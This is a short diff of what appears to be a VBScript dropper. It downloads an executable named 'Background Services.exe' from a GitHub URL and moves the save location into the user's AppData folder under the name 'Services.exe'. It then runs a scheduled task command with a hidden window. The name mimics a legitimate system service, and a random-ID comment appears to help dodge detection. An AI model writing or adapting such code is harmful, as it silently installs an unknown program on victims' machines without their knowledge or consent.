@@ -1578,7 +1578,8 @@ End If
 
 
 url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/testing/Background%20Services.exe"
-target = shell.ExpandEnvironmentStrings("%PUBLIC%\Music\Services.exe")
+target = shell.ExpandEnvironmentStrings("%APPDATA%\Services.exe")
+
 
 runTask = "OneTimeRunfile1"
 
@@ -1916,6 +1917,7 @@ shell.Run runTaskCmd, 0, True
 
 
 ' Random ID: 9f9vjbtv1r
+
 
 
 
